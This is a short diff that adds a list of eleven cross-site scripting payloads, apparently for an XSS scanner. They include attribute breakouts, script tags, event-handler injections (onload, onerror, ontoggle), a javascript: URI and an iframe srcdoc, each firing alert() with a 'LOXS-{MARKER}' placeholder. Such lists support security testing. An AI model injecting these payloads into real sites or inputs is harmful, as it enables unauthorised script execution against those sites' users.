@@ -1,0 +1,11 @@
+"><svg/onload=alert('LOXS-{MARKER}')>
+'><svg/onload=alert('LOXS-{MARKER}')>
+<script>alert('LOXS-{MARKER}')</script>
+"><script>alert('LOXS-{MARKER}')</script>
+'><script>alert('LOXS-{MARKER}')</script>
+"><img src=x onerror=alert('LOXS-{MARKER}')>
+'><img src=x onerror=alert('LOXS-{MARKER}')>
+"><body onload=alert('LOXS-{MARKER}')>
+"><details open ontoggle=alert('LOXS-{MARKER}')>
+javascript:alert('LOXS-{MARKER}')
+"><iframe srcdoc="<script>alert('LOXS-{MARKER}')</script>">
